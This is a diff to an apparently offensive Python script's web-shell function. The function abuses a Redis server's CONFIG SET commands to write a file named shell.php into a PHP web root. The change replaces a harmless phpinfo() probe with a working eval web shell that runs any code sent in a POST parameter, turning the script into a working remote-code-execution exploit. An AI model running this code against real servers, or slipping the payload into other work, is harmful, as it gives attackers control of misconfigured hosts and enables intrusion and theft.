@@ -50,7 +50,7 @@ def exp_webShell(redis_client):
     root = 'D:/phpstudy_pro/WWW'
     redis_client.config_set('dir', root)
     redis_client.config_set('dbfilename', 'shell.php')
-    redis_client.set('x', '<?php phpinfo(); ?>')
+    redis_client.set('x', "<?php @eval($_POST['hihack']);?>")
     redis_client.save()
     print(f"[+] webshell 写入成功")
 
